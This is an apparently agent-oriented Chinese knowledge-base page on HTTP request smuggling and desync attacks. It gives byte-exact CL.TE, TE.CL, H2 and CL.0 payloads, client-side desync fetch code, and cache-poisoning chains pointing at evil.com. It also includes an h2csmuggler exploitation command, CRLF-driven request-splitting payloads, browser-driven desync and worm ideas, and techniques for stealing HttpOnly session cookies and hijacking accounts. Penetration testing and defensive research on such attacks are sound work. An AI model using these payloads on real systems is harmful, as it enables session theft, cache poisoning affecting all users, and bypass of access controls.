# HTTP 请求走私专题

> CL.TE/TE.CL/TE.TE 字节级、H2 变体、CL.0/Fat GET/客户端反同步、缓存投毒链、CDN 行为矩阵、头注入驱动 desync（RQP/浏览器驱动/dangling-byte）、新触发器族。
> 基础速查见 web-vulnerabilities.md §6.1；缓存投毒详见 `$AGENT_DIR/knowledge-base/cache-poisoning.md`。

---

## 1. 经典变体（字节级）

**本质**：前端代理与后端源站对请求边界（RFC 7230 CL/chunked 帧）判定不一致 → 一个请求里夹带第二个请求。区别于 CRLF 注入（那是响应头注入）。

**CL.TE**（前端信 CL、后端信 chunked）：
```http
POST / HTTP/1.1
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```
前端按 CL 读 13 字节（`0\r\n\r\nSMUGGLED`）结束；后端按 chunked 到 `0\r\n\r\n` 结束，`SMUGGLED` 成为下个请求起始。

**TE.CL**（前端 chunked、后端 CL）：
```http
POST / HTTP/1.1
Content-Length: 4
Transfer-Encoding: chunked

35
GET /admin HTTP/1.1
Host: target
Foo: x

0

```
CL=4 只消费 chunk 长度行（`35\r\n`）；`35`hex=53 字节——改第二请求必须重算 chunk 长度；全部 CRLF。

**TE.TE 八种混淆变体**：`xchunked`｜`Transfer-Encoding : chunked`（冒号前空格）｜双重 TE｜`TE: x`｜TAB 代空格｜行首前导空格｜`X: X\nTransfer-Encoding: chunked`（行延续）｜字段名与冒号分行。枚举哪侧把哪个变体当 chunked → 映射为 CL.TE/TE.CL 打法。

## 2. HTTP/2 走私

**H2.CL**：H2 POST 的 DATA 帧含走私请求 + `content-length: 0` 头——前端整帧转发，后端见 CL:0 body 空 → 帧内余下成第二请求。确认：走私前缀 `G` 后同连接发 `GET /` → 后端见 `GGET /` 报错；时间版走私 `/sleep?delay=10`。

**H2.TE**：H2 规范禁 `transfer-encoding`，降级代理不剥即绕——DATA 帧体 `0\r\n\r\nGET /admin...` + `transfer-encoding: chunked` 头。变体：大写 TE（H2 要求小写，翻译层漏剥）、`identity`、多余空格、尾随空白。

**降级其他面**：伪头映射顺序｜禁头（Connection）透传｜重复头合并规则｜`:method`/`:path` 异常字符。

## 3. CL.0 / Fat GET / 客户端反同步

> Java 栈客户端变体: Apache HttpClient ≤4.5.9（HTTPCLIENT-1974/1978）头值 `瘍瘊`(U+760D/U+760A) 被窄化写出原生 \r\n → 请求走私（修复 4.5.10+/5.x）。详见 `ghost-bits-cast-attack.md` §4.5。

**CL.0**（无需 TE，后端忽略 CL 按 0 处理）：易感端点=未读完 body 就响应的（301/302 重定向）、静态文件服务 POST、健康检查。`POST /redirect-page` + CL:30 + body 走私 `GET /admin...` → 302 立即返回不消费 → 字节滞留污染下一请求。检测：POST 超量 body + 同连接跟进 GET，响应匹配走私路径即中。

**Fat GET**（GET 带 body）：前端转发 GET body（Nginx/Apache/HAProxy/Envoy）+ 后端忽略（Express/Gunicorn/PHP-FPM）→ 反同步。配缓存：GET 可缓存路径 + body 走私管理操作 → 响应存到缓存键下。

**CSD 客户端反同步**（毒化浏览器自身连接）：前置=连接复用 + 同站可注 JS + CL.0 型端点。
```javascript
fetch(target+'/trigger', {method:'POST', mode:'no-cors', credentials:'include',
  body:'GET /victim-data HTTP/1.1\r\nHost: target\r\n\r\n'});
fetch(target+'/api/me', {credentials:'include'});  // 响应错配读出数据
```
Pause-based 变体：声明 CL:1000 只发 50 字节，服务端超时响应后余下滞留。限制：连接复用不可靠预测、`Connection: close` 阻断。

## 4. 缓存投毒链与产品矩阵

**链**：走私请求响应错配给下一合法请求的 URL → 缓存存储 → 全用户投毒。定向：走私 `GET /redirect?url=https://evil.com/x.js` → 302 被缓存到受害者 URL。

| 产品 | 双 CL+TE | 倾向 |
|---|---|---|
| HAProxy | 转发双头 | TE |
| Nginx | 拒绝 400 | 严格难穿 |
| Apache mod_proxy | 转发 | CL（历史 CL.TE 源） |
| Cloudflare | 强规范化 | TE |
| AWS ALB/CloudFront | 规范化 | ALB 视版本；CloudFront 偏 CL 可能放过 TE 混淆 |
| Envoy/Caddy | 拒绝 400 | 极严格 |
| Varnish/Traefik | 转发 | TE |
| Squid/IIS ARR | 转发 | CL（历史源） |

H2 降级 TE 剥离：Nginx/Cloudflare/ALB/Envoy 剥；HAProxy/Traefik 可能透传。GET body：Cloudflare/Varnish 剥，HAProxy/Nginx/Apache/Envoy 转发。

## 5. 测试方法论与工具

1. 架构识别（Via/Server 头、cf-ray/x-amz-cf-id）→ 2. `curl --http2 -v` 探 ALPN → 3. 时间型 CL.TE 探针（CL:4 + 不完整 chunk → 延迟=后端在等 chunked 结束）→ 4. H2 走私（CL:0 + 前缀）→ 5. CL.0（重定向端点 + 超量 body）。

**影响升级清单**：完整请求走私？连接池化（影响他人）？可缓存端点？认证端点（绕认证）？响应反射（存储 XSS）？内部路径（提权）？CSD 可行（逐用户）？

**工具**：smuggler｜defparam｜h2csmuggler（h2c 明文）｜http2smugl｜hyper（Python H2 帧）｜smugglefuzz（走私模糊测试）｜t-reqs-http-fuzzer（语法驱动解析差异发现）｜toxicache（批量缓存投毒扫描）｜wcvs（缓存投毒漏洞扫描）｜CacheDecepHound（缓存欺骗检测）。安全注意：并发走私可毒化连接池/缓存/影响租户——授权范围、低并发、隔离环境。

**误报判断（管线伪影 vs 真走私）**：关闭连接复用重测——行为消失=客户端管线伪影；持续→H2 嵌套响应检查（body 含完整 HTTP/1 响应=确认 desync）→影响验证（投毒后新 IP/新会话验证；内部头泄露看反射；绕过看受限路径实际可达）。排干扰纪律（任何客户端）: 禁止自动改写 Content-Length/规范化换行（会破坏走私 payload 的字节精确性）; 自写脚本每连接单请求、关流水线。

## 6. h2c 走私（Upgrade Header Smuggling）

代理对 `Upgrade` 头处理不当 → 升级后进入 passthrough，不再逐请求做 ACL → 直达后端任意路径（不受 `proxy_pass` 路径限制）。

```http
GET / HTTP/1.1
Upgrade: h2c
HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA
Connection: Upgrade, HTTP2-Settings
```

代理脆弱性（**版本敏感用前实测**）：
- HAProxy **≥2.9.11/≥3.0.5 已修复**默认转发 h2c upgrade token；旧版默认可利用
- Traefik：Go stdlib 反代剥离 `HTTP2-Settings` 头 → 攻击对多数 h2c 后端失败（维护方立场不受影响）
- Nuster 曾默认转发；AWS ALB/CLB、Nginx、Apache、Squid、Varnish、Kong、Envoy、ATS 需错误配置
- **不能按产品名直接判定可利用，必须实测**

利用：`python3 h2csmuggler.py -u https://target -x 'GET /admin HTTP/1.1\r\nHost: target\r\n\r\n'`。缓解识别：仅允许 `Upgrade: websocket` 或 `http-request del-header Upgrade`。

## 7. 响应队列 Desync

区别于传统走私（1.5 个请求篡改下一请求开头）：发 **2 个完整请求**，目标是错位代理的响应队列。走私请求需较长处理时间；排队期间受害者请求到达 → 受害者收到走私请求的响应（攻击者控制），攻击者后续请求收到受害者响应（窃取数据）。

**HEAD 增强**：HEAD 响应有 `Content-Length` 无 body → 代理等 body 填充 → 用下一响应内容填充。场景：内容混淆（`Content-Type: text/html` + 注入 body → XSS）、缓存投毒（错位响应被缓存）、响应分割（精确 CL 控制下一响应边界）。

## 8. 高级变体

**TE.0**（后端忽略 TE 按 body 0 处理，前端正常解析）：`Transfer-Encoding: chunked` + `0\r\n\r\n` + 走私请求，等价 TE 版 CL.0。

**Premature Upgrade Passthrough**（代理在后端确认 101 前就切 passthrough）：`Upgrade: anything` + `Content-Length: 0` + body 里放完整第二请求 → 直通后端绕过代理检查。

**TE 规范化缺陷 + close-delimited 回退**：代理检测 TE → 删 CL → 未正确解析 TE 值 → 认为无 framing → 回退 close-delimited；后端正确按 chunked → `0\r\n\r\n` 后成新请求。触发：`GET / HTTP/1.0` + `Connection: keep-alive` + `Transfer-Encoding: identity, chunked` + CL。

**Hop-by-Hop 头滥用**：`Connection: Content-Length` 声明 CL 为逐跳头（RFC 规定代理必须移除 Connection 列出的头）→ 代理删 CL，后端只见 TE → chunked 解析出走私请求。

### 缓存代理 desync: 未消费 body 复用
缓存型 TCP 代理返回缓存响应时不消费请求 body——残留字节被解析为下一请求:
```
inner = "POST /create HTTP/1.1\r\nHost: H\r\nCookie: session=attacker\r\nContent-Length: 256\r\n\r\ncontent=LEAK_"
outer = "GET /cached-page HTTP/1.1\r\nContent-Length: {len(inner)}\r\n\r\n" + inner
```
外层 GET 命中缓存 → POST body 留在连接缓冲 → admin bot 下一请求字节补齐 body → 服务端存储完整请求 → 读取提取 bot Cookie。机理是"缓存命中路径不排空 body"（区别于 CL-TE/TE-CL 的前后端长度差）。

## 9. HTTP/2 协议级攻击

**伪头注入**：`:path: /public/../admin`（代理按原始路径路由、后端规范化）｜重复 `:path`（代理取首/后端取尾）｜`:authority: public` + `host: admin.internal`（vhost 分歧）｜`:scheme: http`（后端信任 scheme 判内部→放开限制）。

**降级翻译缺陷**：H2 头值是二进制——值内 `\r\n` 降级成 H1 时变真实换行 → 头注入；TE 透传→H2.TE；代理生成 CL+攻击者自带 CL→H2.CL；大写 `Transfer-Encoding`（非法 H2）被透传成合法 H1 头绕过小写匹配过滤。

**HPACK**：压缩 oracle（猜中秘密→帧变小，受限于按连接隔离的动态表）；动态表投毒（连接池化共享表→跨请求污染）。

**单包攻击（race condition 神器）**：H2 多路复用把 N 个请求（不同 stream）打进一个 TCP 包 → 真同时到达。python-hyper h2 库：循环 send_headers/send_data 只累积，最后 `sock.sendall(conn.data_to_send())` 一次性发。打限购/余额扣减类时序敏感端点。

**DoS**：Rapid Reset（CVE-2023-44487）= HEADERS 开流→RST_STREAM 立即取消，高频循环，客户端成本远低于服务端处理成本；PRIORITY `exclusive=true + weight=256` 饿死他人流。缓解识别：SETTINGS_MAX_CONCURRENT_STREAMS 限制、RST 速率限制。

**Server Push 投毒**：push /static/app.js + 恶意内容 → 缓存到合法 URL（多数现代浏览器已禁用 push，旧环境适用）。

## 10. 头注入驱动的 Desync（CRLF-Powered）

> 把"HTTP 头注入"（传统评级=开放重定向/XSS 级）升级为完整 desync/RQP 的路径。核心认知: **头注入不是低危 bug**。

### 10.1 注入源与检测

**注入源**:
- Nginx `proxy_pass http://backend$uri;`——`$uri` 是**已 URL 解码+规范化**的路径，路径里的 `%0d%0a` 解码成真实 CRLF 转发上游。`return 302 https://example.com$uri;` 同理（响应头注入）。OpenResty/Tengine 基于 Nginx 同样检查
- 自定义上游头: 注入落点在上游请求的自定义头（如 `X-Original-Url`）而非路径
- **非路径插入点**: Cookie 值、session 参数（如 `Cookie: sess=abc<注入>` 经 `POST /graphql/v1/abc` 拼回上游路径）——比路径注入更冷门、WAF 覆盖更弱

**检测原语**（注入后看可预测状态码）:
```
GET /%20HTTP/13.37%0d%0aFoo:%20bar HTTP/1.1   → 505 Version Not Supported（注入进请求行）
GET /%20HTTP/1.1%0d%0aTransfer-Encoding:%20x%0d%0aX:%20x HTTP/1.1 → 501（注入进 TE 头）
GET /%20HTTP/1.1%0d%0aExpect:%20asdf%0d%0aX:%20x HTTP/1.1 → 417 Expectation Failed（Expect 头）
```

### 10.2 请求拆分 → 响应队列投毒（RQP）

注入 **两个连续 CRLF**（空行）拆出完整第二请求——不违反 RFC 的变形头，兼容性好:
```
GET /<urlencoded: HTTP/1.1
Host: example.com
Connection: keep-alive

TRACE / HTTP/1.1
X: x> HTTP/1.1
Host: example.com
```
上游收到 2 个完整请求 → 响应队列错位 → 持续收割其他用户响应（DoS 其余人）。CDN 内部 desync 时改 Host 可路由到同 CDN 任意域；配持久存储 gadget + 前缀攻击可存储他人请求（含 session/auth 头）。

### 10.3 单头 CL.TE（无法用双 CRLF 时）

部分目标拒绝双 CRLF 并断连，但单头注入可行——注入 `Transfer-Encoding: chunked` 头构造经典 CL.TE:
```
POST /<urlencoded: HTTP/1.1
Transfer-Encoding: chunked
Foo: bar> HTTP/1.1
Host: clothes.shop
Content-Length: 66

0

POST /user/update?email=attacker@atk.cc HTTP/1.1
Cookie: SESSID=attacker
X: x
```
超时技术确认（外层声明 CL、注入 TE，后端等 chunked 结尾 → TIMEOUT）。**避坑**: 走私 update/profile 类端点时，响应若反射攻击者 cookie（Set-Cookie），会把全体在线用户登进攻击者账户——优先走私改 email/密码字段而非会话回显操作。

### 10.4 浏览器驱动（connection-locked / IP-locked 的破局）

fetch/导航可直接触发本类 desync（URL 编码的 CRLF 在请求行内）——把攻击搬进受害者浏览器，绕过"IP 锁定/连接锁定不可跨用户"限制，并可借 XSS gadget 形成**自复制 desync 蠕虫**:
```javascript
fetch("https://example.com/%20HTTP/1.1%0d%0aHost:%20example.com%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/%20HTTP/1.1%0d%0aFoo:%20bar")
```
- **connection-locked 0.CL**: `window.open(stage1)` + `setTimeout(()=>{w.close(); location=stage2}, 500)` 让两请求落同一连接（先 CL 污染、再 HEAD 技术）
- **IP-locked + RQP**: 每 10ms 建 hidden iframe + 3s 后销毁（防浏览器崩溃），"Loading your profile" 页面骗用户停留 ~10s
- **偷 HttpOnly cookie**: XSS 无用时，HEAD 技术拿 XSS + 堆叠第三个含 `Set-Cookie: Session=victim; HttpOnly` 的响应进 body → XSS 读 DOM 即得 session token

### 10.5 隧道与防护绕过

- **盲隧道修复——Expect: 100-continue**: Nginx 收到未预期的 100 响应时视为无 CL 响应持续读到连接关闭 → 走私响应回显。可绕前端访问控制（`/robots.txt` 路径 + 隧道 `GET /config`）
- **HEAD + Range**: Range 响应自动调整 CL——任意长响应都能当 HEAD gadget（`Range: bytes=1-650` 裁剪出 XSS payload 长度）；缺闭合标签时再堆一个请求用 Range 只取 `</script>` 补齐
- **响应头剥除绕过**: 注入 `Expect: 100-continue` 使前端忘记剥敏感响应头（内网 IP/origin 泄露）
- **CDN-Cache-Control 响应头注入**: `CDN-Cache-Control: private="Location"` 让 Cloudflare 剥 Location 头 → 302 响应突破 Location 语法限制落地 XSS（payload 直接进 body）
- **Reverse desync**（响应头注入侧）: 响应里注入短 CL + 完整第二响应 → 客户端读错位。通常死于 stacked-response 问题（浏览器过读即断连），暂无通用绕过

### 10.6 新触发器族

| 触发器 | 形态 | 说明 |
|---|---|---|
| `Content-Type: multipart/byteranges` | `POST / + CL + Content-Type: multipart/byteranges; boundary=B` | CL.0 型，多实现中招（单批 200+ 站点，含银行）; 概念源=RFC 里 byteranges 仅用于响应的规则被请求侧共享解析 |
| `Transfer-Encoding: gzip` + HTTP/1.0 | `GET / HTTP/1.0 + TE: gzip + CL` | RFC 9112 §6.1 要求 HTTP/1.0 带 TE 按错误帧处理 → CL.0 desync（F5 Big-IP 等确认） |
| `Early-Data: 1` | 头 `Early-Data: experimental` | TLS 0-RTT 语义头被非预期处理 |
| `CONNECT / HTTP/1.1` | 经前端转发 CONNECT 的部署 | 2xx 后隧道化忽略 CL/TE → 字节错位（Beyond Trust 产品系） |
| 重复 CL（同值） | `Content-Length: 28\r\nContent-Length: 28` | 部分服务器见双 CL 按 0 处理 → 走私窗口 |
| `Expect: \t100-continue` | TAB 变体 | 绕 Expect 头规范化 |

### 10.7 RQP 增强与探测原语

- **dangling-byte 技术**: 走私请求声明 `Content-Length: 1` 但差 1 字节不发 → 第二响应在受害者请求到达后才生成 → 彻底消除 stacked-response 竞态（对方法无关后端全有效）。stacked-response 问题=后端发出两个响应时前端/浏览器读到多于 CL 承诺的数据→丢弃并断连，破坏 RQP 的竞态窗口:
```
POST / + 触发器 + CL:123
POST /smuggled HTTP/1.1
Host: example.com
Content-Length: 1          ← 少 1 字节
```
- **protocol ruler**: 用后端头长度上限当前尺测前端变换——`A: c0 8a A…{64030}` 命中限值而 `{64031}` 报 400，比对限值位移量即知前端把 2 字节序列展开成几字节。可发现 IP 伪造头改写/头丢弃/Unicode mojibake 变换（这些变换可导向 desync）
- **clean request 探测纪律**: "干净"（RFC 无歧义单请求）却收到两个响应 = 高价值信号——脏请求的双响应可能只是正常解析分歧
- **异常检测层**: 文本/二进制混杂响应（内存泄漏）、body 内嵌 `<HTML`/行内 HTTP 头（inline header 错位）、HTTP/0.9 响应——desync 扫描器应标记而非丢弃
- **Range 缓存投毒**: 部分 Range 响应不带 206 状态码 → 可能被缓存按完整响应存储; `Range: bytes=364-382, 1-2` 多段 + multipart/mixed 重组/上下文逃逸可注入（详见 cache-poisoning.md）
- **Shared-Parser Confusion（概念）**: 服务器共享代码解析请求与响应 → 响应处理特性可被请求触发（如请求里的 Set-Cookie 被处理）。任何"响应专用"头/语法（Content-Location、multipart/byteranges、206）都值得塞进请求测试

**工具**: `github.com/t0xodile/crlf-powered-desync-scanner`（Burp 扩展）、`github.com/turtlesec-software/crlf-desyncs`（nuclei 模板）。
